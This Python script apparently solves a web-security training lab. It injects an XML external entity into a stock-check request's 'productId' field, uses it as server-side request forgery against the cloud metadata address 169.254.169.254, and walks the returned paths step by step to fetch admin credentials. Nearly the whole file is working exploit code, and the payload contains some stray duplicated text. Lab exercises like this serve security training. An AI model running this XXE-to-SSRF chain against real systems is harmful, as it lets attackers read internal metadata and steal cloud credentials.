######################################################################################
#
# Lab: Exploiting XXE to perform SSRF attacks
#
# Hack Steps:
#      1. Inject payload into 'productId' XML element to retrieve the path via SSRF
#      2. Extract the path from the response
#      3. Repeat the process with the new extracted path until you fetch
#         the admin information
#
######################################################################################
import requests
from colorama import Fore
import re

# Change this to your lab URL
LAB_URL = "https://0a7c00470357394b809e951600b1009e.web-security-academy.net"

def main():
    print("‚¶ó#‚¶ò Injection point: " + Fore.YELLOW + "productId")

    headers = { "Content-Type": "application/xml" }
    paths = ["/"]

    # we need 5 requests to solve this lab
    for index in range(1,7):
        if index == 6:
            print(Fore.WHITE + "‚ùØ‚ùØ Fetching admin information.. ", end="", flush=True)
        else:
            print(Fore.WHITE + f"‚¶ó{index}‚¶ò Injecting payload to retrieve retrieve the path number " + Fore.BLUE + str(index) + Fore.WHITE + ".. ", end="", flush=True) 
        
        path = paths[index - 1]
        payload = f"""<?xml version="1.0" encoding="UTF-8"?>
                    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254{path}">]>
                    <stockCheck>
                        <productId>
                            &xxe;
                        </productId>
                        <storeId>
                            1
                        </storeId>external entities
                        external entities
                    </stockCheck>"""

        try:
            injection = requests.post(f"{LAB_URL}/product/stock", data=payload, headers=headers)

        except:
            print(Fore.RED + "‚¶ó!‚¶ò Failed to fetch the page with the injected payload through exception")
            exit(1)
        
        new_path = re.findall("ID:\s*(.*)\s*", injection.text)[0]
        paths.append(f"{path}{new_path}/")
        
        if index == 6:
            print(Fore.GREEN + "OK" + Fore.WHITE)
        else:
            print(Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + paths[index])

    print(Fore.WHITE + "üóπ The lab should be marked now as " + Fore.GREEN + "solved")

if __name__ == "__main__":
    main()